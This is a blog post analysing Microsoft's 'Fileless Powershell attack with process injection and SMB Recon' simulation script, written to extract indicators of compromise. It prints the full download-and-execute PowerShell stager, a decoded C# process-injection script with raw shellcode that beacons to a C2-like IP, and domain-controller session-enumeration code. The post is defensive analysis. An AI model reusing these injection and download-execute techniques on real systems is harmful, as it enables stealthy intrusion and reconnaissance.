---
title: "Microsoft 365 Defender attack simulations: Fileless Powershell attack with process injection and SMB Recon"
layout: post
category: [Microsoft, Simulated Attacks, Microsoft Defender] 
tags: [powershell, fileless, shellcode, c2, microsoft, microsoft defender]
---

## Microsoft 365 Defender attack simulations: Fileless Powershell attack with process injection and SMB Recon

### Summary:
Today I will be doing a deep dive into the new Microsoft 365 Defender attack simulations. I will be looking into the ***Fileless Powershell attack with process injection and SMB Recon*** command script, analyzing the Powershell command script to determine what it will do as well as extracting IOC's (Indicators of Compromise) along the way. This analysis will be done without referencing the Microsoft documentations to demonstrate the investigation process related to a suspicious Powershell command script. Analyzing how it behaves and extracting the necessary IOC's from it to actively block and detect related threats.

### The Initial Powershell Command Script: 

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor    = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String =   (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt    -UseBasicParsing).Content;Try{ $contentBytes =  [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];  $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression  ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
```

### Start by breaking down the Powershell Script
I first started by breaking down the Powershell script. "Beautifying" the code so that it is more readable and to better understand exactly what each line of code does. 

Firstly we know that within Powershell each command is separated with a semi-colon. I then started by inserting a new line after each semi-colon. From there I just corrected the syntax and indents and was left with a more readable command to start analysis. 

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;

$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');

$base64String = (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt -UseBasicParsing).Content;

Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };

$i = 0;

$decryptedBytes = @();

$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
    $i++;
    if ($i -eq $xor.Length) {$i = 0} 
    };
    
Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
```

### Breaking down the script commands line by line:

To understand the Powershell command script better we will break it down line by line. 

`[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;`


Will set the security protocol to use TLS 1.2. 

`$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');`

Will set the variable $xor to what appears to be the XOR key. 

`$base64String = (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt -UseBasicParsing).Content;`

Will reach out to hxxps[://]winatpmanagement[.]windows[.]com/client/management/static/MTP_Fileless_Recon[.]txt and read the content into the variable called $base64String. 

`Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };`

Will try to convert the content within the variable $base64String from base64 and read it into the variable called $contentBytes. 

`$i = 0;
$decryptedBytes = @();
$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
    $i++;
    if ($i -eq $xor.Length) {$i = 0} 
    };`

Will decrypt the content from $contentBytes using xor encryption and calling the variable $xor. 

`Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))`

Lastly will execute the content within $decryptBytes using Invoke-Expression. 

To be able to retrieve the data output I simply ran the commands within my Kali environment being careful not to invoke the command. 

![](/assets/images/Pasted_image_20210426115115.png)

From our output we can see that this command serves as a stager for a second Powershell script. 

Powershell script pulled from stager command: 

```powershell
... REDACTED ...

public class CodeInjection
{
    const string c_targetProcess = @"%windir%\System32\notepad.exe";

    private static readonly byte[] s_shellcode = new byte[] { 0x48, 0x83, 0xEC, 0x48, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x89, 0xE5, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x40, 0x20, 0x48, 0x89, 0x45, 0x08, 0x48, 0x8B, 0x45, 0x08, 0x48, 0x8B, 0x48, 0x50, 0xE8, 0x9E, 0x02, 0x00, 0x00, 0x3D, 0x3F, 0xD6, 0xEC, 0x8F, 0x48, 0x8B, 0x45, 0x08, 0x74, 0x09, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0x08, 0xEB, 0xDF, 0x48, 0x8B, 0x40, 0x20, 0x49, 0x89, 0xC6, 0x48, 0x89, 0xC1, 0xBA, 0x8E, 0x4E, 0x0E, 0xEC, 0xE8, 0xBD, 0x02, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x6B, 0x02, 0x00, 0x00, 0xE8, 0x0C, 0x00, 0x00, 0x00, 0x57, 0x69, 0x6E, 0x48, 0x74, 0x74, 0x70, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x59, 0xFF, 0xD0, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x4E, 0x02, 0x00, 0x00, 0x49, 0x89, 0xC5, 0xBA, 0xBE, 0x6D, 0x02, 0xD1, 0x4C, 0x89, 0xE9, 0xE8, 0x87, 0x02, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x35, 0x02, 0x00, 0x00, 0xE8, 0x32, 0x00, 0x00, 0x00, 0x4D, 0x00, 0x79, 0x00, 0x48, 0x00, 0x6F, 0x00, 0x76, 0x00, 0x65, 0x00, 0x72, 0x00, 0x63, 0x00, 0x72, 0x00, 0x61, 0x00, 0x66, 0x00, 0x74, 0x00, 0x49, 0x00, 0x73, 0x00, 0x46, 0x00, 0x75, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x4F, 0x00, 0x66, 0x00, 0x45, 0x00, 0x65, 0x00, 0x6C, 0x00, 0x73, 0x00, 0x00, 0x00, 0x59, 0x48, 0x83, 0xEC, 0x30, 0x4D, 0x31, 0xC9, 0x4D, 0x31, 0xC0, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x44, 0x89, 0x4C, 0x24, 0x20, 0xE8, 0x00, 0x01, 0x00, 0x00, 0x4D, 0x00, 0x6F, 0x00, 0x7A, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x2F, 0x00, 0x35, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x20, 0x00, 0x28, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x6F, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x4E, 0x00, 0x54, 0x00, 0x20, 0x00, 0x31, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x3B, 0x00, 0x20, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x36, 0x00, 0x34, 0x00, 0x3B, 0x00, 0x20, 0x00, 0x78, 0x00, 0x36, 0x00, 0x34, 0x00, 0x29, 0x00, 0x20, 0x00, 0x41, 0x00, 0x70, 0x00, 0x70, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x57, 0x00, 0x65, 0x00, 0x62, 0x00, 0x4B, 0x00, 0x69, 0x00, 0x74, 0x00, 0x2F, 0x00, 0x35, 0x00, 0x33, 0x00, 0x37, 0x00, 0x2E, 0x00, 0x33, 0x00, 0x36, 0x00, 0x20, 0x00, 0x28, 0x00, 0x4B, 0x00, 0x48, 0x00, 0x54, 0x00, 0x4D, 0x00, 0x4C, 0x00, 0x2C, 0x00, 0x20, 0x00, 0x6C, 0x00, 0x69, 0x00, 0x6B, 0x00, 0x65, 0x00, 0x20, 0x00, 0x47, 0x00, 0x65, 0x00, 0x63, 0x00, 0x6B, 0x00, 0x6F, 0x00, 0x29, 0x00, 0x20, 0x00, 0x43, 0x00, 0x68, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x2F, 0x00, 0x34, 0x00, 0x32, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x32, 0x00, 0x33, 0x00, 0x31, 0x00, 0x31, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x33, 0x00, 0x35, 0x00, 0x20, 0x00, 0x53, 0x00, 0x61, 0x00, 0x66, 0x00, 0x61, 0x00, 0x72, 0x00, 0x69, 0x00, 0x2F, 0x00, 0x35, 0x00, 0x33, 0x00, 0x37, 0x00, 0x2E, 0x00, 0x33, 0x00, 0x36, 0x00, 0x20, 0x00, 0x45, 0x00, 0x64, 0x00, 0x67, 0x00, 0x65, 0x00, 0x2F, 0x00, 0x31, 0x00, 0x32, 0x00, 0x2E, 0x00, 0x32, 0x00, 0x34, 0x00, 0x36, 0x00, 0x00, 0x00, 0x59, 0xFF, 0xD0, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xD8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xC4, 0xBA, 0x8F, 0xAE, 0x8A, 0x00, 0x4C, 0x89, 0xE9, 0xE8, 0x11, 0x01, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xBF, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xE1, 0xE8, 0x1E, 0x00, 0x00, 0x00, 0x32, 0x00, 0x30, 0x00, 0x34, 0x00, 0x2E, 0x00, 0x37, 0x00, 0x39, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x39, 0x00, 0x37, 0x00, 0x2E, 0x00, 0x32, 0x00, 0x30, 0x00, 0x33, 0x00, 0x00, 0x00, 0x5A, 0x41, 0xB8, 0x50, 0x00, 0x00, 0x00, 0x45, 0x31, 0xC9, 0xFF, 0xD0, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x84, 0x00, 0x00, 0x00, 0x49, 0x89, 0xC4, 0xBA, 0xC1, 0xE1, 0x34, 0x8F, 0x4C, 0x89, 0xE9, 0xE8, 0xBD, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x6F, 0x4D, 0x31, 0xC9, 0x48, 0x83, 0xEC, 0x40, 0x4C, 0x89, 0x4C, 0x24, 0x30, 0x4C, 0x89, 0x4C, 0x24, 0x28, 0x4D, 0x31, 0xC9, 0x4D, 0x31, 0xC0, 0x4C, 0x89, 0x4C, 0x24, 0x20, 0xE8, 0x08, 0x00, 0x00, 0x00, 0x47, 0x00, 0x45, 0x00, 0x54, 0x00, 0x00, 0x00, 0x5A, 0x4C, 0x89, 0xE1, 0xFF, 0xD0, 0x48, 0x85, 0xC0, 0x74, 0x3B, 0x49, 0x89, 0xC4, 0xBA, 0x82, 0x88, 0x34, 0x98, 0x4C, 0x89, 0xE9, 0xE8, 0x74, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x26, 0x48, 0x83, 0xEC, 0x40, 0x4D, 0x31, 0xC9, 0x4C, 0x89, 0x4C, 0x24, 0x30, 0x4D, 0x31, 0xC0, 0x4C, 0x89, 0x4C, 0x24, 0x28, 0x48, 0x31, 0xD2, 0x4C, 0x89, 0xE1, 0x4C, 0x89, 0x4C, 0x24, 0x20, 0xFF, 0xD0, 0x48, 0x85, 0xC0, 0x74, 0x00, 0xEB, 0xFE, 0x31, 0xC0, 0x31, 0xD2, 0x48, 0x85, 0xC9, 0x74, 0x23, 0x66, 0x8B, 0x11, 0x66, 0x85, 0xD2, 0x74, 0x1B, 0x48, 0x83, 0xC1, 0x02, 0xC1, 0xC8, 0x0D, 0x66, 0x83, 0xFA, 0x41, 0x72, 0x0A, 0x66, 0x83, 0xFA, 0x5A, 0x77, 0x04, 0x66, 0x83, 0xC2, 0x20, 0x01, 0xD0, 0xEB, 0xDD, 0xC3, 0x31, 0xC0, 0x31, 0xD2, 0x48, 0x85, 0xC9, 0x74, 0x10, 0x8A, 0x11, 0x84, 0xD2, 0x74, 0x0A, 0x48, 0xFF, 0xC1, 0xC1, 0xC8, 0x0D, 0x01, 0xD0, 0xEB, 0xF0, 0xC3, 0x48, 0x31, 0xC0, 0x48, 0x85, 0xC9, 0x74, 0x72, 0x49, 0x89, 0xC9, 0x4D, 0x31, 0xC0, 0x45, 0x8B, 0x41, 0x3C, 0x47, 0x8B, 0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x4D, 0x01, 0xC8, 0x48, 0x31, 0xC9, 0x41, 0x8B, 0x48, 0x18, 0x4D, 0x31, 0xD2, 0x45, 0x8B, 0x50, 0x20, 0x4D, 0x01, 0xCA, 0x48, 0x31, 0xC0, 0x67, 0xE3, 0x46, 0xFF, 0xC9, 0x4D, 0x31, 0xDB, 0x45, 0x8B, 0x1C, 0x8A, 0x4D, 0x01, 0xCB, 0x51, 0x52, 0x4C, 0x89, 0xD9, 0xE8, 0x9C, 0xFF, 0xFF, 0xFF, 0x5A, 0x59, 0x39, 0xD0, 0x75, 0xDE, 0x4D, 0x31, 0xD2, 0x45, 0x8B, 0x50, 0x24, 0x4D, 0x01, 0xCA, 0x66, 0x41, 0x8B, 0x0C, 0x4A, 0x48, 0x81, 0xE1, 0xFF, 0xFF, 0x00, 0x00, 0x4D, 0x31, 0xD2, 0x45, 0x8B, 0x50, 0x1C, 0x4D, 0x01, 0xCA, 0x48, 0x31, 0xC0, 0x41, 0x8B, 0x04, 0x8A, 0x4C, 0x01, 0xC8, 0xC3 };


    public static void Main(string[] args)
    {
        Inject();
    }

    public static void Inject()
    {
        string targetProcessCommand = Environment.ExpandEnvironmentVariables(c_targetProcess);
        ProcessStartInfo startInfo = new ProcessStartInfo(targetProcessCommand);
        startInfo.UseShellExecute = false;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        Process targetProc = Process.Start(startInfo);
        System.Threading.Thread.Sleep(50);

        var createdProcessPtr = targetProc.OpenProc(ProcessExtensions.ProcessAccessFlags.All);
        if (createdProcessPtr == IntPtr.Zero)
        {
            System.Threading.Thread.Sleep(50);
            createdProcessPtr = targetProc.OpenProc(ProcessExtensions.ProcessAccessFlags.All);
        }
        ProcessExtensions.ProcessHandler = createdProcessPtr;

        System.Threading.Thread.Sleep(500);
        IntPtr remoteshellcodeAddr = targetProc.Alloc(s_shellcode.Length);
        if (remoteshellcodeAddr == IntPtr.Zero)
        {
            System.Threading.Thread.Sleep(50);
            remoteshellcodeAddr = targetProc.Alloc(s_shellcode.Length);
        }

        bool res = targetProc.Write(remoteshellcodeAddr, s_shellcode);
        if (!res)
        {
            System.Threading.Thread.Sleep(50);
            targetProc.Write(remoteshellcodeAddr, s_shellcode);
        }
        
        targetProc.Call(remoteshellcodeAddr, IntPtr.Zero);
        string msg = "Hi!" + Environment.NewLine +
            "A shellcode was just injected to this process" + Environment.NewLine +
            "If your OS build is 1809 or higher, then keep this window open to see WDATP's Auto IR in action!" + Environment.NewLine +
            "Otherwise, feel free to close this window" + Environment.NewLine + Environment.NewLine +
            "More info in our walkthrough under: https://securitycenter.windows.com/tutorials";
        msg = msg.Replace("@", "$");
        targetProc.TypeText(msg);
    }
}
"@;Add-Type -TypeDefinition $source;[CodeInjection]::Inject()

$logfile = $env:temp + '\reconlog.txt'
function Write-DebugLog 
{
   param( [string]$message, [string]$filepath =  $logfile )   
   $message | Out-File $filepath -append
   Write-Host $message   
}

{
   param( [string]$cmdline)
   Write-DebugLog "Will run $cmdline"
   $result = Invoke-Expression $cmdline  2>&1 | %{ "$_" } | Out-String
   Write-DebugLog $result   
}


function DoRecon() {    
    Add-Type -TypeDefinition @"

    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;

    public class MyNetSes
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct SESSION_INFO_10
        {
            [MarshalAs(UnmanagedType.LPWStr)]
            public string OriginatingHost;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string DomainUser;
            public uint SessionTime;
            public uint IdleTime;
        }

        private static class Netapi32
        {
            [DllImport("Netapi32.dll", SetLastError = true)]
            public static extern int NetSessionEnum(
                    [In, MarshalAs(UnmanagedType.LPWStr)] string servername,
                    [In, MarshalAs(UnmanagedType.LPWStr)] string clientname,
                    [In, MarshalAs(UnmanagedType.LPWStr)] string username,
                    Int32 level,
                    out SESSION_INFO_10 bufptr,
                    int prefmaxlen,
                    ref Int32 entriesread,
                    ref Int32 totalentries,
                    ref Int32 resume_handle);     
        }

        public static int  smbRecon(string host)
        {
            SESSION_INFO_10 sInfo = new SESSION_INFO_10();
            Int32 entriesread = 0;
            Int32 totalentries = 0;
            Int32 resume_handle = 0;
            var returnCode = Netapi32.NetSessionEnum(host, null,null, 10,out sInfo, -1, ref entriesread, ref totalentries, ref resume_handle);
        
            return returnCode;
        }   
    }
"@

    try {
        $domains = [System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain() 
    }
    catch {
        Write-DebugLog "Failed to resolve Domain Controllers in the domain"
        return;
    }

    $domains.DomainControllers | ForEach-Object {         
        if (Test-Connection  $_ -Quiet) {
            Write-DebugLog "can reach $_"
            $result = [MyNetSes]::smbRecon($_)            
            Write-DebugLog "ran NetSessionEnum against $_ with return code $result"
        }        
    }    
}

DoRecon
```

Going forward I will refer to this script as Stage 2. 

Reviewing this Stage 2 script, we can see it doing a lot of interesting stuff. Firstly we can see it injecting shellcode into the ***%windir%\\System32\\notepad.exe*** process. 

Furthermore writing a log file to ***$env:temp + '\\reconlog.txt'***. 

Lastly calling the Netapi32.NetSessionEnum API to enumerate sessions information against the DC's. 

### Looking deeper into the injected shellcode: 

Diving deeper into the shellcode we can see from the Stage 2 Powershell script. I started by copying the shellcode from the script and removing the 0x so that I am left with the raw shellcode. 

#### shellcode: 

```
4883EC484883E4F04889E565488B042560000000488B4018488B402048894508488B4508488B4850E89E0200003D3FD6EC8F488B45087409488B0048894508EBDF488B40204989C64889C1BA8E4E0EECE8BD0200004885C00F846B020000E80C00000057696E487474702E646C6C0059FFD04885C00F844E0200004989C5BABE6D02D14C89E9E8870200004885C00F8435020000E8320000004D00790048006F007600650072006300720061006600740049007300460075006C006C004F006600450065006C0073000000594883EC304D31C94D31C0BA0100000044894C2420E8000100004D006F007A0069006C006C0061002F0035002E00300020002800570069006E0064006F007700730020004E0054002000310030002E0030003B002000570069006E00360034003B002000780036003400290020004100700070006C0065005700650062004B00690074002F003500330037002E0033003600200028004B00480054004D004C002C0020006C0069006B00650020004700650063006B006F00290020004300680072006F006D0065002F00340032002E0030002E0032003300310031002E0031003300350020005300610066006100720069002F003500330037002E0033003600200045006400670065002F00310032002E00320034003600000059FFD04885C00F84D80000004989C4BA8FAE8A004C89E9E8110100004885C00F84BF0000004C89E1E81E0000003200300034002E00370039002E003100390037002E0032003000330000005A41B8500000004531C9FFD04885C00F84840000004989C4BAC1E1348F4C89E9E8BD0000004885C0746F4D31C94883EC404C894C24304C894C24284D31C94D31C04C894C2420E80800000047004500540000005A4C89E1FFD04885C0743B4989C4BA828834984C89E9E8740000004885C074264883EC404D31C94C894C24304D31C04C894C24284831D24C89E14C894C2420FFD04885C07400EBFE31C031D24885C97423668B116685D2741B4883C102C1C80D6683FA41720A6683FA5A77046683C22001D0EBDDC331C031D24885C974108A1184D2740A48FFC1C1C80D01D0EBF0C34831C04885C974724989C94D31C0458B413C478B8401880000004D01C84831C9418B48184D31D2458B50204D01CA4831C067E346FFC94D31DB458B1C8A4D01CB51524C89D9E89CFFFFFF5A5939D075DE4D31D2458B50244D01CA66418B0C4A4881E1FFFF00004D31D2458B501C4D01CA4831C0418B048A4C01C8C3
```

I first started my analysis by running the shellcode through an online disassembler. 
https://onlinedisassembler.com/odaweb/

This will dissemble my shellcode to assembly as well as provide us with a hexdump of the shellcode. 

![](/assets/images/Pasted_image_20210426121313.png)

From this hexdump we are already able to see some interesting strings. 

I then proceeded to throw the hexdump into CyberChef to extract the strings. 

![](/assets/images/Pasted_image_20210426122022.png)

From this we are able to see a lot of valuable information and get an idea of what the shellcode will execute. 

Based off the strings the shellcode looks to be using winhttp.dll to communicate to 204[.]79[.]197[.]203 with the following user-agent "Mozilla/5.0 (Windows NT 10.0 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246" and appears to be sending the string "MyHovercraftIsFullOfEels"

Looking into the IP, it looks to me mimicking a C2 server and that the string "MyHovercraftIsFullOfEels" signals that it is a payload "calling". 

![](/assets/images/Pasted_image_20210426122728.png)

### Extracting the IOC's

To sum up what we have found so far. We were giving a suspicious Powershell command script which when executed will reach out to   hxxps[://]winatpmanagement[.]windows[.]com/client/management/static/MTP_Fileless_Recon[.]txt to fetch a base64 encoded and xor encrypted payload which when decoded will give us our Stage 2 powershell script and invoke it. The script will then inject shellcode into notepad.exe which will then communicate out to the C2 server. It will then run SMB sessions enumeration against all DC's within the domain and log it to a file under temp called "reconlog.txt".  

### IOC's:

#### Files: 
    C:\\Users\\*\\AppData\\Local\\Temp\\reconlog.txt

#### Domains: 
    hxxps[://]winatpmanagement[.]windows[.]com

#### IP's: 
    204[.]79[.]197[.]203

#### Strings: 
    WinATP-Intro-Injection, MyHovercraftIsFullOfEels

### Refs: 
<a href="https://docs.microsoft.com/en-us/microsoft-365/security/defender/m365d-pilot-simulate?view=o365-worldwide" target="_blank">https://docs.microsoft.com/en-us/microsoft-365/security/defender/m365d-pilot-simulate?view=o365-worldwide</a>

<a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.servicepointmanager.securityprotocol?view=net-5.0" target="_blank">https://docs.microsoft.com/en-us/dotnet/api/system.net.servicepointmanager.securityprotocol?view=net-5.0</a>

<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.1" target="_blank">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.1</a>

<a href="https://onlinedisassembler.com/odaweb/" target="_blank">https://onlinedisassembler.com/odaweb/</a>

<a href="https://gchq.github.io" target="_blank">https://gchq.github.io</a>